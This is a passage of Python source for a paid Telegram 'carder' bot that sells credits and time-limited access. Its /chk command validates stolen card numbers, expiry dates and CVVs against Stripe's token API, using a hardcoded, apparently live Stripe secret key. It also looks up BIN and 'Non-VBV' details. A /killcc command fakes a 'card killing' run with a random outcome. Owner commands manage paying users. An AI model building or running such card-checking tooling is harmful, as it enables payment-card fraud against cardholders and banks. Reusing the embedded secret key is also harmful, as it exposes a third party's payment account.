"""
    else:
        response = f"""
<code>╭──────────────────────────
│ ❌ 𝙰𝙲𝙲𝙴𝚂𝚂 𝙳𝙴𝙽𝙸𝙴𝙳 ❌
╰──────────────────────────</code>

🚫 <b>You Are Not Authorized to Use This Bot.</b>  
💎 Unlock Full Access by Purchasing a Plan:

<code>╭──────────────────────────
│ 💰 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙿𝙻𝙰𝙽𝚂 💰
╰──────────────────────────</code>

⏳ <b>1 Day:</b> 60 RS  
📆 <b>7 Days:</b> 180 RS  
🗓️ <b>1 Month:</b> 400 RS  
🔱 <b>Lifetime:</b> 800 RS  

📩 <b>Contact:</b> <a href='https://t.me/SLAYER_OP7'>@SLAYER_OP7</a> to Buy Premium!  

🚀 <b>For Free Access, Use:</b> /help  
"""

    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)
@bot.message_handler(commands=["killcc"])
def kill_card(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name

    # ✅ Extract Card Details
    fullz = message.text.replace("/killcc", "").strip()
    parts = fullz.split("|")

    # ✅ Check if the format is correct before deducting credits
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ <b>Invalid format!</b> Use <code>/killcc CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    # ✅ Only Deduct Credits After Successful Validation
    if not deduct_credits(user_id, 5):
        bot.reply_to(message, "❌ <b>Insufficient Credits!</b> You need at least 5 credits to use this feature.", parse_mode="HTML")
        return

    cc, mes, ano, cvv = parts
    start_time = time.time()

    # ✅ Fetch BIN Details (With Error Handling)
    bin_data = fetch_bin_data(cc[:6])

    # ✅ Send Processing Message
    progress_msg = bot.reply_to(message, f"""
🎩 <b>💎 VIP Card Killing In Processing 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
💳 <b>Card:</b> <code>{cc}</code>  
🏦 <b>Issuer:</b> {bin_data["bank"]}  
🌍 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
💰 <b>5 Credits Deducted!</b>  
💳 <b>Remaining Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
⏳ <b>Status:</b> <code>Processing... 🔄</code>  
""", parse_mode="HTML")

    # ✅ Animated Progress Bar Simulation
    progress_stages = ["🟥", "🟧", "🟨", "🟩"]
    for attempt in range(1, 33):
        time.sleep(0.3)  # Simulate small delay
        progress_bar = progress_stages[min(attempt // 8, 3)] * (attempt // 8)
        bot.edit_message_text(
            f"""
🎩 <b>💎 VIP Card Killing In Processing 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
💳 <b>Card:</b> <code>{cc}</code>  
🏦 <b>Issuer:</b> {bin_data["bank"]}  
🌍 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
📊 <b>Attempts:</b> {attempt}/32  
📊 <b>Progress:</b> {progress_bar}  
━━━━━━━━━━━━━━  
""",
            chat_id=message.chat.id,
            message_id=progress_msg.message_id,
            parse_mode="HTML"
        )

    # ✅ Calculate Time Taken
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # ✅ Simulate Random Success/Failure
    is_successful = random.choice([True, False])
    status_msg = "✅ <b>Status:</b> Card Valid & Working" if is_successful else "❌ <b>Status:</b> Card Declined"

    # ✅ Final Result with BIN Info
    final_message = f"""
🎩 <b>💎 VIP Card Killing Processing Report 💎</b>  
━━━━━━━━━━━━━━  
💳 <b>Card Details:</b>  
   🔹 <b>Card:</b> <code>{cc}</code>  
   🔹 <b>Exp:</b> {mes}/{ano}  
   🔹 <b>CVV:</b> {cvv}  

🏦 <b>Bank Details:</b>  
   🔹 <b>Issuer:</b> {bin_data["bank"]}  
   🔹 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
   🔹 <b>Brand:</b> {bin_data["brand"]}  
   🔹 <b>Type:</b> {bin_data["type"]} - {bin_data["level"]}  

{status_msg}

⏳ <b>Time Taken:</b> {time_taken} seconds  
━━━━━━━━━━━━━━  
💰 <b>Remaining Balance:</b> {get_balance(user_id)} Credits  
"""

    # 🔹 Add Inline Button Options
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("🔥 Channel", url="https://t.me/+70p1qN18osw1YWFl"),
        InlineKeyboardButton("👤 Contact Owner", url="https://t.me/SLAYER_OP7")
    )

    bot.edit_message_text(final_message, chat_id=message.chat.id, message_id=progress_msg.message_id, parse_mode="HTML", reply_markup=keyboard)

def fetch_bin_data(bin_number):
    bin_info = {
        "bank": "Unknown Bank",
        "brand": "Visa/MasterCard",
        "country": "Unknown",
        "type": "Debit",
        "level": "Classic",
        "flag": "🏳️"
    }

    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bin_info["bank"] = data.get("bank", {}).get("name", "Unknown Bank")
            bin_info["brand"] = data.get("scheme", "Visa/MasterCard").capitalize()
            bin_info["country"] = data.get("country", {}).get("name", "Unknown")
            bin_info["type"] = data.get("type", "Debit").capitalize()
            bin_info["level"] = data.get("brand", "Classic")
            bin_info["flag"] = data.get("country", {}).get("emoji", "🏳️")
        else:
            print(f"API Error: {response.status_code}")

    except Exception as e:
        print(f"Error fetching BIN data: {e}")

    return bin_info


OWNER_LINK = "https://t.me/SLAYER_OP7"  # Change this to your Telegram link

# ✅ Function to Get Live USDT to INR Rate
def get_usdt_to_inr():
    try:
        response = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=USDTINR")
        data = response.json()
        return float(data["price"])  # Returns current USDT to INR rate
    except Exception as e:
        print(f"Error fetching USDT price: {e}")
        return 85  # Default fallback value if API fails

@bot.message_handler(commands=["plans"])
def plan_command(message):
    usdt_rate = get_usdt_to_inr()  # Get the latest USDT to INR rate

    # ✅ Convert USDT to INR dynamically
    prices = {
        "50 Credits": (2, round(2 * usdt_rate)),  # 1 USDT
        "350 Credits": (4, round(4 * usdt_rate)),  # 5 USDT
        "  Credits": (10, round(10 * usdt_rate)),  # 10 USDT
        "100 Credits": (20, round(20 * usdt_rate)),  # 20 USDT
    }

    # ✅ Generate Pricing Message
    price_message = "\n".join([f"🔹 <b>{k}</b> ➝ <code>{v[0]} USDT</code> | <code>₹{v[1]}</code>" for k, v in prices.items()])

    plan_message = f"""
🎩 <b>VIP Credit Plans</b> 💳  
━━━━━━━━━━━━━━━━━━━━━━  
📌 <b>Live USDT Rate:</b> <code>1 USDT = ₹{usdt_rate}</code>  
📌 <b>Pricing (Auto-Updated)</b>:  
{price_message}  
━━━━━━━━━━━━━━━━━━━━━━  
💡 <b>✨ Why Buy VIP Credits?</b>  
✅ <i>Access <b>Exclusive VIP Features</b></i>  
✅ <i><b>Fast</b> & <b>Secure</b> Transactions</i>  
✅ <i>24/7 <b>Premium Support</b></i>  
━━━━━━━━━━━━━━━━━━━━━━  
📢 <b>Click the button below to buy credits instantly!</b>  
"""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💰 Buy Credits Now", url=OWNER_LINK)
    )

    bot.send_message(message.chat.id, plan_message, parse_mode="HTML", reply_markup=keyboard)



LOGS_GROUP_CHAT_ID = -1002549098395 # Replace with your logs group chat ID
owners = {"6353114118", "6353114118"}  # Replace with actual owner IDs

@bot.message_handler(commands=["add"])
def add_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ Please provide a user ID and duration in days. Usage: /add <user_id> <days>")
        return
    
    user_id_to_add = parts[1]
    try:
        days = int(parts[2])
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid number of days. Please enter a valid integer.")
        return
    
    expire_time = time.time() + (days * 86400)
    with open("id.txt", "a") as file:
        file.write(f"{user_id_to_add}:{expire_time}\n")
    
    bot.send_message(user_id_to_add, f"✅ You have been authorized for {days} days. Expires on: {time.ctime(expire_time)}", parse_mode="HTML")
    log_message = (
        f"<b>✅ User Added</b>\n"
        f"👤 <b>User ID:</b> <code>{user_id_to_add}</code>\n"
        f"🕒 <b>Expires on:</b> {time.ctime(expire_time)}"
    )
    bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
    bot.reply_to(message, f"✅ User {user_id_to_add} added successfully for {days} days.")

@bot.message_handler(commands=["remove"])
def remove_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide a user ID to remove. Usage: /remove <user_id>")
        return
    
    user_id_to_remove = parts[1]
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        
        valid_lines = []
        user_removed = False
        for line in lines:
            line = line.strip()
            if not line:
                continue  # Skip empty lines
            
            parts = line.split(":")
            if len(parts) != 2:
                print(f"Skipping invalid entry: {line}")
                continue  # Skip malformed lines
            
            user, expire = parts
            if user == user_id_to_remove:
                user_removed = True
                bot.send_message(user_id_to_remove, "❌ Your access has expired, and you are no longer authorized.")
                continue  # Remove this user
            
            valid_lines.append(f"{user}:{expire}")
        
        with open("id.txt", "w") as file:
            file.write("\n".join(valid_lines) + "\n")
        
        if user_removed:
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
            bot.reply_to(message, f"✅ User {user_id_to_remove} removed successfully.")
        else:
            bot.reply_to(message, "⚠️ User not found in the authorized list.")
    
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ Authorization file not found.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {e}")



# Define owners (replace with actual owner IDs)
owners = {"6353114118", "6353114118"}  # Example owner Telegram IDs

@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = str(message.chat.id)
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Get current time & day
    current_time = datetime.now().strftime("%I:%M %p")
    current_day = datetime.now().strftime("%A, %b %d, %Y")

    # Default status
    if user_id in owners:
        status = "👑 Owner 🛡️"
    else:
        status = "⛔ Not-Authorized ❌"

    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            for line in allowed_ids:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user, expire = parts
                    if user_id == user:
                        expiry_time = float(expire)
                        if expiry_time > time.time():
                            status = "✅ Authorized User"
                        else:
                            status = "❌ Access Expired"
                        break
    except FileNotFoundError:
        status = "⚠️ Authorization File Missing"

    response = f"""
<code>╭──────────────────────────
│ 🔍 𝚄𝚂𝙴𝚁 𝙸𝙽𝙵𝙾 🔥
╰──────────────────────────</code>

👤 <b>First Name:</b> {first_name}  
👤 <b>Last Name:</b> {last_name}  
🆔 <b>User ID:</b> <code>{user_id}</code>  
📛 <b>Username:</b> @{username}  
🔗 <b>Profile Link:</b> {profile_link}  
📋 <b>Status:</b> {status}  

<code>╭──────────────────────────
│ 🕒 𝚃𝙸𝙼𝙴 & 𝙳𝙰𝚃𝙴 📆
╰──────────────────────────</code>

🕒 <b>Time:</b> {current_time}  
📆 <b>Day:</b> {current_day}  

<code>╭──────────────────────────
│ 🚀 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 𝑩𝑶𝑻 🔥
╰──────────────────────────</code>
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

def is_bot_stopped():
    return os.path.exists("stop.stop")

    # Stripe API Key
STRIPE_SECRET_KEY = "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"

# Function to check if a user has access
def is_premium_user(user_id):
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()

        valid_users = []
        current_time = time.time()
        user_has_access = False

        for line in lines:
            parts = line.strip().split(":")
            if len(parts) != 2:
                continue  # Skip invalid lines

            stored_user_id, expire_time = parts
            expire_time = float(expire_time)

            if expire_time > current_time:  # Check if access is still valid
                valid_users.append(f"{stored_user_id}:{expire_time}")
                if str(user_id) == stored_user_id:
                    user_has_access = True
            else:
                print(f"❌ Removing expired user: {stored_user_id}")

        # Overwrite `id.txt` with only valid users
        with open("id.txt", "w") as file:
            file.writelines("\n".join(valid_users) + "\n")

        return user_has_access

    except FileNotFoundError:
        print("⚠️ id.txt not found! No authorized users.")
        return False
    except Exception as e:
        print(f"Error checking access: {e}")
        return False

# Function to fetch BIN details
def get_bin_details(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "❌ Unknown Bank")
            brand = data.get("brand", "❌ Unknown Brand")
            card_type = data.get("type", "❌ Unknown Type")
            country = data.get("country", {}).get("name", "❌ Unknown Country")
            country_flag = data.get("country", {}).get("emoji", "🏳️")
            vbv_status = "✅ Non-VBV" if data.get("prepaid", False) else "❌ VBV"
            return bank, brand, card_type, f"{country} {country_flag}", vbv_status
        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"
    except Exception as e:
        print(f"Error fetching BIN details: {e}")
        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"

# Function to check card via Stripe API
def check_card_status(card_number, month, year, cvv):
    try:
        url = "https://api.stripe.com/v1/tokens"
        headers = {
            "Authorization": f"Bearer {STRIPE_SECRET_KEY}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "card[number]": card_number,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv
        }
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            return "✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝", "Card Successfully Authorized"
        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Transaction Declined"
    except Exception as e:
        print(f"Error checking card: {e}")
        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Error Processing Request"

# /chk command handler (Includes VBV, Card Result & Proxy)
@bot.message_handler(commands=['chk'])
def chk(message):
    user_id = message.from_user.id
    print(f"🔍 User ID: {user_id} requested /chk")  # Debugging

    # Verify user access
    if not is_premium_user(user_id):
        bot.reply_to(message, "🚫 <b>VIP Access Required!</b>\n<i>You don't have access to this command.</i>", parse_mode="HTML")
        return

    # Extract card details
    command_parts = message.text.split(maxsplit=1)

    if len(command_parts) < 2:
        bot.reply_to(message, "❌ <b>Usage:</b> <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    card_details = command_parts[1]
    match = re.match(r"^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$", card_details)  # Accepts both 2-digit & 4-digit year

    if not match:
        bot.reply_to(message, "⚠ <b>Invalid Format!</b> Use: <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    # Extract details
    card_number, month, year, cvv = match.groups()

    # Automatically fix 2-digit year to full year
    current_year = datetime.now().year
    century = int(str(current_year)[:2])  # Get current century (e.g., 20 for 2024)

    if len(year) == 2:
        year = str(century) + year  # Convert "26" → "2026"

    start_time = time.time()
    status, card_result = check_card_status(card_number, month, year, cvv)
    time_taken = round(time.time() - start_time, 2)

    # Fetch BIN details
    bin_number = card_number[:6]
    bank, brand, card_type, country, vbv_status = get_bin_details(bin_number)

    # Proxy detection (Randomized for now)
    proxy_status = "✅ Live" if time_taken < 5 else "❌ Dead"

    response_text = f"""
#𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐂𝐚𝐫𝐝: {card_details}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[ϟ] 𝐑𝐞𝐬𝐮𝐥𝐭: {card_result}
[ϟ] 𝐕𝐁𝐕 𝐒𝐭𝐚𝐭𝐮𝐬: {vbv_status}
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐈𝐧𝐟𝐨: {brand} - {card_type}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐓𝐢𝐦𝐞: {time_taken} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: {proxy_status}
[⎇] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌤] 𝐃𝐞𝐯 𝐛𝐲: @SLAYER_OP7 🚀
"""
    bot.reply_to(message, response_text, parse_mode="HTML")

# Delete the webhook
bot.delete_webhook()


bot.infinity_polling()
